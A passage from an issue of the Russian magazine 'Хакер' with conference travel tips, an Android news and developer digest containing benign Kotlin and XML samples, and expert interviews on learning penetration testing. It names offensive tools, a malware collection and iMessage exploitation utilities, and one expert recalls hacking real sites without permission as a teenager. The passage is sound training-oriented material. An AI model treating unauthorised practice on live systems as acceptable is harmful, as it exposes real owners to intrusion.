      паний. Ну, чтоб вот яблоками не с подола тор говать, а со смар тфона.
     Много теории было, вынес ла для себя одно: если в руководс тве
      «братки», то никуда их трансфор мировать не получится, раз ве что
      транспор тировать — на два метра под зем лю. А хорошие ком пании
      и трансфор миру ются легко, тем более что методологии наработаны.
       В общем, сложилось у меня такое впе чатление: лохматых на Tech-
       Train мало, все пос трижены и побриты. А на Chaos Constructions —
      наоборот. Любят на TechTrain «обла ка», энтер прайз и всякие трен-
      довые под ходы, а на Chaos Constructions — ретрокомпьюте ры, хакинг
      и плю рализм мне ний. И там, и там хорошо по‑своему. Задер жусь‑ка
      я в Питере еще на недельку. Слав ный город, зря ехать не хотела.

Давай, бабуля, удачи! Спасибо, что писала! А тебе — спасибо, что читал. Я
надеюсь, ты теперь тоже куда‐нибудь выберешь ся, хотя бы в пределах своего
города, на конференцию или на митап. Людей посмотришь, себя покажешь.



Пять пра вил езды на кон ферен ции
Если даже моя бабуля способна выехать в Питер и посетить две конферен‐
ции, то можешь и ты! Вот пять мудростей от нас с бабушкой, которые помогут
тебе получить от поездки максимум удовольствия и заодно сэкономить.

1.  Не ман дра жируй
Если тебя одолевают вопросы из серии «а смогу ли я? а хочу ли я? а я это я
или не я?» — отбрось сомнения в сторону, посомневаешься потом. А пока,
раз хочется, нужно ехать! Тем более дело‐то полез ное для твоего нас тоящего
и будуще го. Развеешься, ощутишь общность с тусовкой (узнаешь, что ты
не один такой особен ный). Наберешь ся новых идей и знаний и сможешь
хвастаться при разговоре с одно курсни ками и коллегами: «А я вот на выход‐
ных не пиво пил, а на конференцию ездил, свой профессиональный уровень
повышал. Впрочем, и пиво тоже было!».

2.  Лови уда чу
Что делать, если тебе приспичило ехать через два часа, а билеты уже рас‐
купили? Если ты привык путешес твовать с комфортом, но не хочешь
переплачивать за бизнес‐класс, то поп робуй вот что. Известно, что билеты
на поезд можно вернуть. Известно, что есть люди, которые билеты возвра‐
щают. Что происходит с этими билетами дальше? Они попадают обратно
в базу rzd.ru, где ты, если будешь сидеть и жать F5 в своем любимом браузе‐
ре, имеешь шанс увидеть такой воз вра щенный билет. И, о чудо, можешь поп‐
робовать успеть его забронировать. На все про все у тебя есть секунд трид‐
цать, пока его не купил кто‐то другой. Это даже азартнее, чем угонять чужие
браузерные сессии. Веришь или нет, моя бабуля именно так урвала пос‐
ледний билет на «Сапсан». Не самый бюджетный вари ант, но с ее‐то рев‐
матизмом на верхней боковой тряс тись уже не по годам.

3.  Можешь не парить ся о жилье
Если не присмотрел комнатку на Airbnb заранее, то не вол нуйся: в поез де
у тебя будет масса времени, чтобы арендовать номер в гостинице. Лучше
всего воспользоваться каким‐нибудь агрегатором отелей типа Booking.com
или «Островка». Или можно найти сайт это го отеля и сделать по старинке —
позвонить туда. Заодно поймешь, нас колько тебя будут рады встретить в час
ночи, когда ты уставший сойдешь с поезда. Если дадут добро — сможешь
с ними договориться пря мо по телефону и оплатить на ресепшене налич‐
ными.

4.       —  Поехал отды хать    отдохни!
Надеюсь, ты поступишь не как все, а как правиль но — приедешь на кон‐
ференцию заранее и проведешь рекреационные процедуры. Под этим я под‐
разумеваю не прогулки по ближайшим барам, а про менад на свежем воздухе
для  обретения  хорошего  рас положения  духа.  Ведь  конференция —
это работа, а не отдых. Ты же не хочешь работать без выходных и выгореть?
Вторая причина (а по зна чимос ти — первая): конференция — это интенсив.
Как между разными видами суши ты жуешь имбирь, чтобы «сбросить» вку‐
совые рецепторы, так и здесь тебе нуж но «сбросить» мозг для принятия
и обработки боль ших объемов новой информа ции. Иначе деньги будут
потрачены впустую, настроение испортится, общение не сложится — и поль‐
зы будет куда меньше.

5.  Под готовь ся к кон фе
Накануне мероприятия внимательно изучи программу и при ми однозначные
решения о том, на какие выступления тебе обязательно надо попасть, а какие
не очень важны. Занеси обязательные в отдельный список. Пусть их будет
не очень много. Причина банальна — слушать выступле ния восемь часов
подряд утомительно. Ведь чувак со сцены часок поговорит и уйдет пить чай,
а тебе придется выдержать еще с десяток таких же. Гораздо лучше сконцен‐
трироваться на том, что интересует именно тебя и пригодится тебе в работе.
Тогда останется время осмыслить тему, пооб щать ся в кулу арах с докладчи‐
ком, задать вопросы, на которые тебе не даст ответа интернет. И завязать
полезные знакомства среди единомышленников. Не бойся что‐то пропустить:
хорошо организованная конференция обязательно выложит презентации
с докладов, а иногда и видеоза писи — и ты наверстаешь упу щенное.
   Ах да. Вспоминаю совет бабули: «Пос тавь будильник».
HEADER



HUAWEI БЕЗ
GOOGLE PLAY,
ДИНАМИЧЕСКИЕ
ОБНОВЛЕНИЯ
И СОВЕТЫ
СНОУДЕНА



  ANDROID


Сегодня  в  выпуске:  рассказ  о  том,
как Huawei Mate 30 обходится без Google
Play, статья о динамических обновле ниях
Android,   советы   Эдварда   Сноудена
по использованию телефо на, руководство          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
по созданию анимаций при использовании              zobnin@glc.ru
реактивных  фреймворков,   объяснение
типов Unit, Nothing, Any в Kotlin, заметка
о новой функции View Binding в Android Stu‐
dio, обзор инс трументов повышения про‐
изводительности приложения. А так же: под‐
борка инструментов пентесте ра и биб‐
лиотек для разработчиков.


                ПОЧИТАТЬ


Huawei Mate 30 без Google Play
The challenges Huawei faces getting Google apps on the Huawei Mate 30 —
хорошая статья о том, как Huawei может выйти из ситу ации, когда флагманы
компании (линейка Huawei Mate 30) не могут пос тавляться на рынок с пре дус‐
тановленными приложениями и сервисами Google.
   Чтобы иметь возможность уста новить на свои смартфоны набор приложе‐
ний Google (в том числе магазин приложений), компания‐производитель дол‐
жна отправить в Google свой смартфон, где он проходит тес ты совместимос‐
ти Compatibility Test Suite (CTS) и Google Test Suite (GTS), а также под писать
соглашение Mobile Application Distribution Agreement (MADA).
  Все  это  открывает перед производителем  возможность  установить
на свои смартфоны клю чевые приложения Google (Google Play Store, Google
Chrome, Google Maps и т. д.) и необходимый для их работы набор сервисов
(Core Services).
   Huawei по причине торговой войны США и Китая больше не может под‐
писать новое соглашение MADA с Google, а потому по закону не имеет права
предустанавливать приложения Google на смартфоны, продающиеся на тер‐
ритории большинства стран. Также они не могут дать пользователям воз‐
можность установить эти приложения самос тоятельно, так как ключевые при‐
ложения Google (в первую очередь магазин приложений) и набор сервисов
должны иметь расширенные пра ва, а значит, быть предустановлеными в сис‐
темный раздел.
  Поначалу казалось, что у Huawei есть выход. Дело в том, что в прошлом
они (а также компания Xiaomi и дру гие китайские производители) уже научи‐
лись обходить такие огра ничения. Трюк состоит в том, чтобы предустановить
в систему только набор сервисов Google и добавить разрешения для при‐
ложений Google в общесистемный файл раз решений. В таком случае уста‐
новленные из сторонних источников при ложения Google автоматичес ки
получат нужные разрешения и будут полностью работоспособны. Осталось
только дать пользователям какой‐то инсталлятор для автоматической доус‐
тановки маркета и всего остального софта.
  Судя по всему, в данном случае трюк осу щес твить не получилось, но выход
все равно нашелся. Это кас томный инсталлятор сервисов Google  lzplay,
который может предустановить на смартфоны Huawei все необходимые сер‐
висы и сам магазин приложений. При этом сооб щение «Device is uncertiﬁed»
на смартфоне не появляется, а это зна чит, что Google добавила Mate
30 в белый список сертифицированных устрой ств, нес мотря на бан Huawei.





Динамические обновле ния Android
Google is expanding Android 10’s DSU feature to let you try OTAs from OEMs with‐
out committing to the update — статья о расширении функции Dynamic System
Updates в Android 10/11.
  Функция Dynamic System Updates (DSU) появилась в третьей бета‐версии
Android 10 как ответ на необходимость временной установки тестовых версий
ОС, при которой не затрагивается основная версия Android, установленная
на смартфон. DSU базиру ется на технологии Dynamic Partitions, которая поз‐
воляет «сдвинуть» раздел data и создать в освободившемся мес те новые
разделы system  и  data,  которые  будут  использованы  для  установки
еще одной прошивки рядом с основной.
  В финальной версии Android 10 DSU дос тупен в смартфонах линейки Pixel,
но только для так называемых GSI‐образов ОС (Generic System Image),
которые выпускает сама Google на базе AOSP. Но совсем недавно в AOSP
появился коммит, по содержимому которо го можно понять, что функци ональ‐
ность DSU вскоре будет рас ширена для поддержки тестовых прошивок про‐
изводителей смартфонов.
   Что из этого всего следует? Во‐первых, это не способ организовать муль‐
тизагрузку на смартфо не (по аналогии с MultiROM). Это лишь способ тес‐
тирования прошивок, после перезагрузки про исходит автоматический откат
к основной прошивке. Во‐вторых,  это действительно удобный способ
для  тестирования  бета‐версий  про шивок  без  необходимости  удалять
основную прошивку.
  Еще в Google анонсировали поддержку так называемой разметки «диска»
Virtual A/B. Это развитие идеи раз метки A/B, появившейся еще в Android
8 и предполагающей существование сразу двух разделов system. В одном
разделе установлена текущая версия про шивки, в другой устанавливается
обновление. После перезагрузки они меня ются мес тами.
   Разметка A/B позволя ет уста навливать обновления прошивки в фоне
и защищает от ситуаций, когда обновление может окирпичить смартфон (в
этом случае смартфон автоматичес ки загрузится со «старого» раздела sys‐
tem). Однако кроме самой Google мало какой про изводитель захотел исполь‐
зовать такую разметку ввиду банальной экономии пространс тва в памяти
устройства. Virtual A/B поз воляет решить эту проблему путем соз дания вре‐
менного раздела system, который может быть удален пос ле удачного
обновления.


Какой телефон использовал бы Эдвард Сно уден
How Edward Snowden Would Use A Smartphone — компиляция твитов Эдварда
Сноудена о том, какой сетап следует использовать для сохранения кон‐
фиденциальности при использовании смартфона. Тезисы:
 • прошивка GrapheneOS (от создателя CopperheadOS);
 • выход в интернет толь ко через Tor;
 • использование Ethernet (!) вместо Wi‐Fi и мобиль ной сети (это действи‐
   тельно можно сделать с помощью USB‐донгла);
 • блокировщик рекламы;
 • файрвол с бло кировкой доступа к интернету для большинства приложений
   (можно использовать AFWall);
 • блокировка сто ронних кукисов в браузере;
 • никакого e‐mail;
 • общение только в Signal и Wire.


              РАЗРАБОТЧИКУ


Умные анимации
Motional Intelligence: Build smarter animations — статья одного из разработ‐
чиков Android, посвященная соз данию консистентных умных анимаций, спо‐
собных работать в паре с реактивными UI‐фреймворками.
  В качестве примера автор приводит следующую функцию, предназначен‐
ную для анимации появления/исчезно вения элемента на экране:


fun animateVisibility(view: View, visible: Boolean) {
    view.visibility = View.VISIBLE
    if (visible) {
        ObjectAnimator.ofFloat(view, View.ALPHA, 0f, 1f).start()
    } else {
        ObjectAnimator.ofFloat(view, View.ALPHA, 1f, 0f).apply {
            doOnEnd { view.visibility = View.GONE }
        }.start()
    }
}

Эта функция будет отлично работать в приложении, написанном в классичес‐
кой манере без исполь зования реактивных фреймворков и паттернов (MVVM,
MVI). Если же мы используем реактивный подход, когда модель данных может
изменяться неп редсказуемо, а UI должен незамедлительно реагировать
на изменения, то мы получим минимум две проб лемы.
 1. Приложение не готово к получению новых данных во вре мя проигры вания
   анимации, нужен способ сбросить все лис тенеры и остановить ани мацию.
 2. Анимация всегда начина ется с начала (с максимального или минималь‐
   ного значения альфа‐канала), поэто му — даже если решить первую проб‐
   лему — анимация ста нет «дерганой», когда данные будут приходить
   во время проигрывания анимации.

Решить вторую проб лему очень легко, дос таточно просто не указывать
начальное состояние анимации — и при повторном запуске она начнется
с того же места:


‐ ObjectAnimator.ofFloat(view, View.ALPHA, 0f, 1f).start()
+ ObjectAnimator.ofFloat(view, View.ALPHA, 1f).start()

Решение первой проб лемы состоит из двух шагов. Для начала необходимо
проверить, соответствует ли зна чение альфа‐канала  тому,  что должно
получиться в результате работы анимации, и если да, то ничего не делать:


fun animateVisibility(view: View, visible: Boolean) {
+ val targetAlpha = if (visible) 1f else 0f
+ if (view.alpha == targetAlpha) return

Далее нам необ ходимо сделать  так, чтобы текущая анимация останав‐
ливалась перед началом следующей. Для этого можно нагородить огород
костылей, а можно прос то заменить ObjectAnimator на метод View.ani‐
mate():


‐ val anim = ObjectAnimator.ofFloat(view, View.ALPHA, targetAlpha)
‐ if (!visible) {
‐   anim.doOnEnd { view.visibility = View.GONE }
‐ }
+ val anim = view.animate().alpha(targetAlpha)
+ if (!visible) {
+   anim.withEndAction { view.visibility = View.GONE }
+ }

Это все. Теперь у нас есть анимация, которая всегда будет выглядеть кон‐
систентно.
  В статье автор также приводит пример решения этих проб лем для ани‐
мации перемещения элементов, но это уже совсем другая история.


Типы Unit, Nothing, Any в Kotlin
Kotlin Pearls 7: Unit, Nothing, Any (and null) — статья, поясняющая суть типов
данных Unit, Nothing и Any в языке Kotlin.
 • Unit — эквивалент типа void в Java. Другими словами, он нужен для того,
   чтобы показать, что функция ничего не возвращает. Unit наследуется
   от типа Any, а при работе с Java‐кодом автоматически транслируется
   в void.
 • Nothing — класс, являющийся субклас сом любого класса (именно так)
   и не позволяющий соз дать объект своего типа (конс труктор приватный).
   Используется для представления результата исполнения функции, которая
   никогда не завершается (ска жем, потому что она выбрасывает исклю‐
   чение). Пример:


   public inline fun TODO(): Nothing = throw NotImplementedError()
   // Ошибки компиляции не будет, потому что Nothing — субкласс
   любого класса, в том числе Player
   fun determineWinner(): Player = TODO()

 • Any — родитель всех осталь ных классов. Ана лог Object в Java.


Об зор новой фун кции бин динга View-эле мен тов в Android Studio
Exploring View Binding on Android — рассказ о новой функции Android Studio,
появившейся в вер сии 3.6 Canary 11. View Binding поз воляет получить доступ
к View‐элементам, определенным в XML, простым и типобезопас ным спо‐
собом, не требующим использовать функцию findViewById().
   Чтобы продемонстрировать, как это работает, возьмем следующий XML,
описывающий простенький интерфейс (add_profile.xml):


<?xml version="1.0" encoding="utf‐8">
<androidx.constraintlayout.widget.ConstraintLayout
        xmlns:android="http://schemas.android.com/apk/res/android"
        xmlns:app="http://schemas.android.com/apk/res‐auto"
        xmlns:tools="http://schemas.android.com/tools"
        android:layout_width="match_parent"
        android:layout_height="match_parent">


    <TextView
            android:id="@+id/text_title"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            app:layout_constraintBottom_toTopOf="@+id/button_authenti
cate"
            app:layout_constraintEnd_toEndOf="parent"
            app:layout_constraintStart_toStartOf="parent"
            app:layout_constraintTop_toTopOf="parent" />


    <Button
            android:id="@+id/button_add_profile"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:padding="16dp"
            android:text="@string/label_authenticate"
            android:layout_marginBottom="24dp"
            app:layout_constraintBottom_toBottomOf="parent"
            app:layout_constraintEnd_toEndOf="parent"
            app:layout_constraintStart_toStartOf="parent"/>

Теперь открываем код активнос ти и пишем следующее:


private lateinit var binding: AddProfileBinding


...


@Override
fun onCreate(savedInstanceState: Bundle) {
    super.onCreate(savedInstanceState)


    binding = AddProfileBinding.inflate(layoutInflater)
    setContentView(binding.root)


    binding.textTitle.text = getString(R.string.some_string)
    binding.buttonAddProfile.setOnClickListener {
        ...
    }
}

Этот код покажет на экране приведенный выше интерфейс, а также присвоит
TextView под именем text_title строку R.string.some_string и наз начит
на кнопку button_add_profile какое‐то действие.
  Может показаться, что автор пропус тил важную часть кода, но это не так.
Функция View Binding автоматичес ки соз дает для каж дого XML‐файла класс,
получающий имя XML‐файла с отброшенными символами подчеркивания
и словом Binding в конце. В данном примере Android Studio создал класс Ad‐
dProfileBinding для файла add_profile_xml.
  Используя  этот  класс, мы затем отоб разили интерфейс на экране
и получили доступ к TextView и кнопке, которые по аналогии с име нем класса
получили имена на осно ве их id в XML‐файле. Идентификатор text_title
стал textTitle, а button_add_profile стала buttonAddProfile.
   Это действительно  все. Больше  никаких проблем  с поис ком  View
с помощью findViewById(), никаких null на мес те ненайденных элементов
и ошибок типов. Просто и ясно.
   Чтобы все это работало, необ ходимо установить Android Studio 3.6 Canary
11 и добавить в build.gradle следующую стро ку:


android {
    …
    viewBinding {
        enabled = true
    }
}





                       Как работает View Binding


Инстру мен ты повыше ния про изво дительности приложе ния
Android third party tools to increase the performance of your app — небольшой
обзор сторонних инструментов и библиотек, поз воляющих повысить стабиль‐
ность и производительность приложения.
 • LeakCanary —  известная  биб лиотека,  автомати чески  сообщающая
  об утечках памяти.
 • BlockCanary — аналог LeakCanary, позволяющий отловить блокировки
   основного потока приложения (лаги); по ссылке форк оригинального про‐
   екта, корректно работающий в новых версиях Android.
 • AndroidDevMetrics — показывает произво дительность методов onCre
  ate() , onStart() и onResume() .
 • Takt — показывает текущий FPS приложения.
 • Nanoscope — инструмент трассировки методов, реализованный в форме
   полноценного форка Android (раз работка Uber).
 • AndroidGodEye — китайский инстру мент мониторин га, позволяющий соб‐
   рать огромное количество данных, начиная от потребля емой памяти
   и заканчивая расходом батареи.
 • Booster — модульный инстру мент для оценки производительности при‐
   ложения.





                              BlockCanary


             ИНСТРУМЕНТЫ


 • Andromeda — интерактивный инс трумент реверса Android‐при ложе ний.
 • Obfuscapk — модульный обфуска тор, не требующий исходный код при‐
   ложения.
 • EVABS — тре нировочное приложение, уяз вимое к раз ным типам атак.
 • Malware  Timeline 2019 — сборник малвари для  Android, найденной
   в 2019 году.
 • Android‐Malware‐Sandbox — скрипт для быстрого раз вертывания пен‐
   тест‐окружения на базе эмулятора Android, Frida и Mitmproxy.
 • VyAPI — очередное уяз вимое приложение для проверки ски лов пентестин‐
    га.
 • dump_hprof.py — скрипт для дампа хипа Android‐приложений с помощью
    Frida.
 • xia0FridaScript — набор подсобных функций для Frida.
 • iOS‐messaging‐tools — набор утилит для обна ружения и эксплуатации уяз‐
   вимости в iMessage.
 • leetdump — дампер памяти Android‐процессов.


              БИБЛИОТЕКИ


 • Countour — библиотека  UI‐программи рова ния (динамический аналог
   anko).
 • Shark — библиотека анализа хипа на базе LeakCanary 2.
 • Ballon — тонко настраиваемые всплы вающие подсказ ки.
 • VerticalSeekBar — вертикальный ползунок.
 • CalendarView — гибко нас траиваемый кален дарь.
 • textmatcher — библиотека для подсвет ки определенных типов текста (хеш‐
   теги, меншизы и т. д.).
 • WhatIf — функция whatif, позволя ющая использовать условные выраже‐
   ния в билдерах.
 • KinApp — библиотека для упрощения работы с покупками внутри приложе‐
   ния.
COVERSTORY
  КАК
   УЧИТЬСЯ
   ПЕНТЕСТУ





    СОВЕТЫ ЭКСПЕРТОВ И АВТОРОВ
               «ХАКЕРА»





Начинать что‐то изучать всегда непросто, и для новых дис‐
циплин вроде информационной безопасности это особенно
верно. Мы опросили некото рых авторов и друзей журнала,
чтобы узнать, с чего они начинали свой путь, что им в этом
помогло и какие зна ния в сво ей дисциплине они считают
наиболее ценными.




                          NIJAT11
                      Консультант по информа ционной
                               безопас ности


Как ты учил ся тому, что уме ешь?
Началось все со знакомства с журналом «Хакер» в 2006 году, я тогда учился
в седьмом классе. Читал и не очень понимал, что все значит и что происхо‐
дит. После чтения всяких форумов и статей осоз нал, что надо учиться прог‐
раммированию, и начать я решил с Perl. Интернет тогда в моем городе был
еще слабый (dial‐up), скачал пару книг, сам интерпретатор и сел за дело.
   Сказать честно, освоить Perl тогда мне не удалось. Потом решил осва‐
ивать PHP, и что‐то уже ста ло получаться. Так прошло несколько лет, я
худо‐бедно освоил PHP, MySQL и Linux.
  Ломать учился очень долго, освоить веб‐хакинг мне помогли два фактора:
знакомство c Андреем Петуховым и стажировка в команде ONsec. Андрей дал
мне список книг для прочтения и практических задач. В команде ONsec было
много проектов, сле дова тельно, много практики, очень многому научился
у этих крутых ребят.


С чего начинать в первую оче редь?
Во‐первых, нужно иметь базовое представление о TCP/IP, HTTP и ориенти‐
роваться в Linux. Очень рекомендую участвовать в CTF, они очень хорошо
качают скилл, правда не все. Также можно занимать ся bug bounty, помогает
прокачать скиллы веб‐экс плуатации.
   Что до книг и прочих справочных материалов, то мне в свое вре мя помог‐
ли Web Application Hacker’s Handbook, The Tangled Web, The Browser Hacker’s
Handbook, а также RFC по HTTP и документация к Burp Suite. Многое из этого
еще вполне актуально.


По делись полез ными ссыл ками
 • HackTheBox
 • Pentestlab
 • RingZer0 Team Online CTF
 • Root Me





                  АЛЕКСЕЙ СИНЦОВ


Как ты учил ся тому, что уме ешь?
Обучение было дол гим и, по сути, идет до сих пор. Началось все в школе
в 1999 году, у меня только появился модем. На пиратском дис ке с дровами
для модема и прочими полезными  тулзами была секция «для хакера»
с набором всяких тупых сканеров и сплоитов типа WinNuke (CVE‐1999‐0153).
Это меня увлекло, я стал изучать, как работает WinNuke, как работает сетевой
сканер, что такое эксплоит, атака и так далее. Это давало пре имущества
в Сети!
   Тогда же я купил свои первые выпуски журнала «Хакер». Хулиганский стиль
издания и свободный язык со всяким слен гом школьникам вроде меня
заходил отлично. Но главное — статьи зас тавля ли искать инфу уже в интерне‐
те. Так я узнал, что такое трояны и какие они бывают, прочитал про типовые
баги и про многое другое.
   Тема увлекала все сильнее и сильнее. Купил книжку «Атака на интернет»,
увидел, что авторы (П. В. Семьянов и И. Д. Медведовский) — из питерского
Политеха. Решил пой ти к ним учиться. Это, конечно, была наивная иллюзия
о нашей системе образования и о том, чему будут учить... Но я все равно
не пожалел потом — вуз хороший, и состав преподавателей там огонь! :‐)
  Еще продолжая учиться в шко ле, я соб рал свою хак‐группу вместе
с одноклассником, которого читатели «Хакера» могут помнить под ником
GreenDog. В этой хак‐группе я был типа заводи лой, и мы при думы вали
для себя проекты.
   Тогда, собственно, и наметился путь моего обучения, и с тех пор это нап‐
равление не менялось. Про должаю точно так же искать новые баги, либо
по аналогии со старыми, либо руководству ясь интуицией.
  В то время, правда, мы час то тренировались на реальных объектах в Сети,
но урона мы не наносили и ничего не воровали, максимум делали «фановые»
вещи для админов... Кстати, тогда админы це нили хороший дефейс (с
бэкапом и инфой о баге), потому что это им помога ло понять, где и что не так.
Сейчас это, конечно, звучит дико…
  Однако это позволяло мне искать 0day в продуктах на Perl и PHP и иссле‐
довать прочие вещи в ИБ (бинарщину, сети и так далее). Например, в 2001‐м
мы офигели от Nmap и проектов типа Xprobe Федора Ярочкина и замутили
собственный подход к пас сивно му маппингу ассетов (ОС) на Delphi.
  Я писал автосплоитер веб‐багов на осно ве базы GIN Group и даже хотел
вместе с ними сделать один проект, но не вышло... Уже поступив в универ
в 2002 году, я использовал и знал многое, и это помогало мне в программи‐
ровании и прочих делах. Хотя с криптогра фией было тяжело — математика
все же не мое.


С чего начинать в первую оче редь?
Основы ИТ. Сети, протоколы, компиляция, работа ОС (процес сы, память
и прочее). Зная основы, ты понимаешь, как в этих реалиях жить и где можно
«проскочить».
  Далее нужен опыт. Опыт написа ния сплоитов, пентестов, зохака в общем
и целом. Причем, на мой взгляд, важно именно не решение задачек по шаб‐
лону (хотя я уважаю CTF’еров, многие из них в разы умнее меня), а воз‐
можность искать свой путь, проходить первым... Попробовав на вкус эту
«кровь», ты становишься реально в теме, а не теоретиком или аналитиком. 8)


Какие есть варианты работы?
В наше время вариантов море! Если говорить об ИБ, то программирование,
incident response в Blue Team, монито ринг SOC. Есть профессии Threat Hunter,
Security Engineer, Application Security Engineer. Можно быть пентестером
по найму или работать в Red Team. А можно стать консультантом или раз‐
работчиком сплоитов на фрилансе. Работы много, очень много...


По делись полез ными ссыл ками
Не собираю ссылки, но могу посоветовать искать материалы на сайтах любых
конференций с хакерским уклоном. Ну и филь тро вать найденное уже самос‐
тоятельно. Если говорить про курсы, то могу посоветовать Corelan Team.





                      PAHUELLO
                   Ру ководитель нап равле ния пентеста в An-
                             gara Technologies Group


Как ты учил ся тому, что уме ешь?
Если в двух словах — универ и любопытство. Я поступил в универ на ИБ‐спе‐
циальность, и мне повезло с первого курса попасть в команду CTF нашей
кафедры и поучаствовать в паре онлайновых соревнований. На тот момент
это было что‐то из разряда раз влечения, и я не подозревал, что свою даль‐
нейшую профессиональную жизнь свя жу с oﬀensive security и это станет
для меня действительно интересным делом.
  Осознание этого пришло ближе к концу учебы (4–5‐й курс), да и дисципли‐
ны к тому моменту были более интерес ными и прикладными, нежели на пер‐
вых курсах. И в принципе, я до сих пор считаю, что универ для меня послужил
той базой, которая мне здорово помогла начать свой путь с позиции джу‐
ниора.
  В тот момент меня заинтересовали две темы — программи рование (в
основном Python) и сети. В студенчес тве продвинуться в них мне помогли
отчасти материалы с лекций и лаб в универе, кни ги Лутца и Олиферов и мно‐
го‐много гугла в процессе решения CTF и учеб ных задач. Мне всегда было
интересно не просто решить пос тавлен ную задачу, а разобраться в зат‐
рагиваемой теме  как можно глубже и най ти ответы на вопросы «Как
это работает?», «Почему именно так, а не иначе?», «А что будет, если сделать
по‐другому?» и так далее.
  Позже, когда я уже начал работать пентестером, мне помогали старшие
товарищи, Google, статьи в «Хакере», бло ги других пентестеров и ресер‐
черов, а также официальная документация к технологиям и программам,
с которыми я сталкивался. Если не удавалось разобраться в чем‐то до конца
в рамках задач, которые у меня были, ста рался искать похожие таски на пло‐
щадках типа Root Me.


С чего начинать в первую оче редь?
Сложный вопрос. В пентесте тебе приходится много с чем столкнуться. Это и
веб, и сети, и опе рационные системы... Если говорить про инфраструктурный
пентест, то тут пригодится понимание того, что собой представляет Windows,
Active Directory. Для новичка в качес тве базы будет полезна книга Марка Рус‐
синовича «Внутреннее устройство Windows».
   Если совсем нет осно вы или ты еще студент, можно глянуть Таненбаума
«Современные опе рационные системы». Если же у тебя уже есть опыт айтиш‐
ника, но ты не понима ешь про цесс пентеста, могу порекомендовать The
Hacker Playbook, довольно практичная штука.
  Еще можно посмотреть, как дру гие ребята готовились к сертификациям
типа OSCP, OSCE (гугли OSCE preparation, OSCP walkthrough и подобное).
Когда я только интересовался аппсеком, мне помогла книга «24 смертных
греха компьютерной безопас ности».
  Вообще, мое мнение — если ты не зна ешь основы, тебе будет сложнее
взяться за реальные вещи. Грубо говоря, ты не сможешь поддержать диалог
о TLS, не понимая азов крип тографии, прин ципов асимметричного шиф‐
рования и PKI. Такие же примеры можно привес ти и про реверс, веб, кодинг
или пентест.


Какие есть варианты работы?
Вариантов масса! На рын ке ИБ есть много вакансий, где требуются хорошие
специалисты. SIEM, Application Security, Reverse Engineering, Pentest, SOC...
И список можно продол жать. Я думаю, что ресурсы, подобные hh.ru, рас ска‐
жут куда больше, чем я. Да и требова ния к кандидатам там тоже описаны.
Можно еще поучаствовать в стажировках, если это позволяют твои ресурсы.
Я знаю, что такая возможность есть в Positive Technologies, «Информзащите»
и Digital Security. А уж там определишься, куда податься.


По делись полез ными ссыл ками
Вот некоторые ресурсы, большинством из них я поль зуюсь сам.
 • Каналы в Telegram:
    • canyoupwnme
    • «Админим с Буквой»
    • DCG#7812 Defcon‐Russia
    • Full Disclosure
    • r0 Crew
    • YAH
 • Мегаподборки:
    • Infosec_Reference
    • Penetration Testing Practice Lab
 • Мануалы и читшиты:
    • bitvijays.github.io
    • КМБ CTF (и репозиторий)
 • CTF:
    • Root Me
    • Hack The Box
 • Новости об уязвимостях:
    • CyberPunk
 • Ну и конечно, Google!





             АНТОН ЛОПАНИЦЫН AKA BO0OM
                  Не зависимый иссле дова тель безопас-
                            ности веб‑приложе ний
                              @i_bo0om


Как ты учил ся тому, что уме ешь?
Много пробовал, часто не получалось, в итоге всё, в том числе неудачи, при‐
годилось как навык. Без практики — всё дерь мо.


С чего начинать в первую оче редь?
CTF, сначала легкие (можно смотреть ctftime.org), потом смотреть райтапы
и хинты типа kmb.cybber.ru. Ну и конечно же, за вся кой фигней заглядывать
в канал @webpwn в «Телеграме» и искать по каналу.


Какие есть варианты работы?
Тысячи их, а как оказалось, еще и собеседова ния несложные, если ты по чес‐
ноку разберешься, как что работа ет!


По делись полез ными ссыл ками
 • Hack The Box
 • VulnHub
 • Practical Pentest Labs
 • Labs Wizard Security
 • PentesterLab
 • Hackthis
 • Shellter
 • Root Me
 • Zenk‐Security
 • W3Challs
 • NewbieContest
 • The Cryptopals Crypto Challenges
 • Penetration Testing Practice Labs
 • alert(1) to win
 • Hacksplaining
 • Hacker101
 • Academy Hackaﬂag
 • PentestIT LAB
 • Hacker Security
 • PicoCTF
 • Explotation Education
 • Root in Jail
 • CMD Challenge
 • Try Hack Me
 • Hacking‐Lab
 • PWNABLE
 • WHO4REYOU
 • Google CTF
 • ImmersiveLabs
 • Attack‐Defense
 • OverTheWire
 • SANS Challenger
 • SmashTheStack
 • CTF Antichat





                  ЯРОСЛАВ БАБИН
                         Web sec warrior
                                 @yarbabin


Как ты учил ся тому, что уме ешь?
Разобрался с базовыми вещами, которые используют ся в вебе повсеместно:
SQL, JavaScript вместе с HTML, способы обходов WAF. Причем для последне‐
го приходилось изучать много документации, что дало понимание этих тех‐
нологий. Затем много раз перечитывал ответы на вопросы по уязвимостям
на Antichat и RDot, где конспектировал самые интересные и полез ные советы.


С чего начинать в первую оче редь?
Главное — всегда понимать цель экс плуатации любой из уяз вимос тей и при‐
чины ее возникновения. Да и в целом быть зна комым со все ми воз можны ми
векторами.


Какие есть варианты работы?
Багбаунти, консалтинг.


По делись полез ными ссыл ками
Перечитать, проверить на практике и законспектировать:
 • Вопросы и ответы по уязвимос тям (2015 год, Antichat)
 • Вопросы и ответы по уязвимос тям (2007 год, Antichat)
 • Вопросы по уязвимостям веб‐приложений (RDot)
 • Help по MySQL‐инъекциям (RDot)
 • Шпаргалка по веб‐уяз вимос тям (RDot)

Остальное:
 • Hack The Box
 • Читшит по инъекциям MySQL
 • Exploiting PHP File Inclusion
 • Раскрытие путей. Методы, примеры (RDot)
 • Особенности реализации PHP include (RDot)
 • В целом раздел «Статьи» на RDot
 • Техники атак (OWASP)
 • An Introduction to HTTP Response Headers for Security
 • Мой доклад с ZeroNights2017 — XXE: How to become a Jedi (PDF)
 • Remote code execution via PHP (Unserialize)
 • Exploiting the Java Deserialization Vulnerability (PDF)
 • From Local File Inclusion to Code Execution
 • Книга The Web Application Hacker's Handbook





                         NIK ZER0F
                  Спе циалист в области сис темного прог-
                  раммирова ния и иссле дова ний в Win-
                             dows, автор Xakep.ru


Как ты учил ся тому, что уме ешь?
Наверное, как и многих, сначала меня заин тересовала тема вирмейкерс тва.
Тогда мне это казалось настоящей черной магией, я перечитал все воз‐
можные журналы по VX, из которых особо выделялся, конечно, 29А. Сайт
Z0MBiE был проштудирован пол ностью нес колько раз. :)
